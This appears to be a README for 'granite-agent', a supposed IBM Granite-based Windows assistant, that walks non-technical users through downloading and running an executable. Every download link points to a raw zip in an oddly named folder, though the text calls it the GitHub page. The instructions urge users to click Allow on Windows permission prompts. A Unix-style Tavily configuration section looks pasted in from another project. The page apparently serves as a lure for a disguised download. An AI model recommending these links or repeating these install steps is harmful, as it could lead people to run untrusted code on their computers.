# 🪨 granite-agent - Simple agent for smart tasks

[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)

---

granite-agent is a small program powered by IBM Granite. It helps your computer perform tasks using simple commands. This guide will help you download and start granite-agent on Windows, even if you do not have any technical knowledge.

## 🖥️ What is granite-agent?

granite-agent runs simple commands on your computer with some help from smart language tools. It is designed to help with task automation and web searches. You can think of it as a lightweight assistant that works behind the scenes.

Here are some things granite-agent can do:

- Run commands you give it through a simple interface.
- Connect with online services to gather information.
- Use a small language model to understand basic instructions.
- Help automate repetitive tasks on your computer.

granite-agent works through the command line but does not need you to write code. It understands simple commands written in plain text.

## ⚙️ System Requirements

Before you download granite-agent, make sure your computer meets these requirements:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 1 GHz or faster processor
- Internet connection for online features
- About 100 MB free disk space

You do not need any special software or programming tools to use granite-agent. It comes with everything you need.

## 📥 How to Download granite-agent on Windows

To get granite-agent, you will visit the official page on GitHub. Follow these steps:

1. Click the big blue button below:  
   [Download granite-agent](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)

2. This link takes you to the granite-agent GitHub page.

3. On the GitHub page, find the **Releases** section. Usually, this is on the right side or under the main description.

4. Click on the latest release version number (for example, "v1.0.0").

5. In the release, look for a file with a name ending in `.exe` or similar for Windows.

6. Click that file name to start downloading it to your computer.

7. Wait for the download to finish.

## 🚀 How to Install and Run granite-agent

After you download the file, here is how to set up granite-agent on your Windows computer:

1. Open the folder where you saved the downloaded file. This is usually the **Downloads** folder.

2. Find the downloaded `.exe` file, which is the granite-agent installer or program.

3. Double-click the file to start it.

4. If Windows asks for permission, click **Yes** or **Allow**. This lets the program run.

5. Follow the instructions on the screen (most of the time, just click **Next** or **OK**).

6. When the setup is done, you will see a confirmation message.

7. Close the installer window.

8. Now, open the **Command Prompt**:

   - Press the **Windows** key on your keyboard.
   - Type `cmd`.
   - Press **Enter**.

9. In the Command Prompt window, type `granite-agent` and press **Enter**.

10. The program will start and display a simple prompt.

You can now start using granite-agent by typing commands into the prompt.

If you want to stop the program at any time, type `exit` and press **Enter**.

## 🛠️ Basic Commands for granite-agent

granite-agent uses simple text commands. Here are some basic examples to get you started:

- `help`  
  Shows a list of available commands.

- `search [keyword]`  
  Searches the web for the keyword you type.

- `run [task]`  
  Runs a specific task. For example, `run cleanup` might clean temporary files.

- `status`  
  Shows the current status of the agent.

You do not need to remember all commands right away. Use `help` to see what you can do.

## 🔍 Search Provider Configuration

granite-agent supports two search backends: **DuckDuckGo** (default) and **Tavily**.

To switch to Tavily:

1. Set `search_provider: tavily` in `config.yaml` under `search_config`.
2. Export your Tavily API key as an environment variable:
   ```
   export TAVILY_API_KEY=tvly-YOUR_API_KEY
   ```

If `TAVILY_API_KEY` is set in the environment and no explicit `search_provider` is configured, Tavily will be used automatically.

You can get a free Tavily API key (1,000 credits/month) at https://app.tavily.com.

## 🔧 Tips for Using granite-agent

- Make sure you have an internet connection when performing online searches.

- Keep granite-agent updated by checking the downloads page regularly.

- Use clear, simple words for commands to get the best results.

- granite-agent works best on a standard Windows PC. Other Windows versions may not work perfectly.

- Do not close the Command Prompt window while granite-agent is running.

## 📂 Where to Find More Information

Detailed guides and updates are available on the GitHub repository:

[Download and learn more about granite-agent](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)

You can also find help with issues or questions there.

## 🔄 Updating granite-agent

When a new version is released, repeat the download and installation steps above. New versions improve performance and add features.

Delete the old installer files to save disk space. Your settings will not be affected.

---

[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)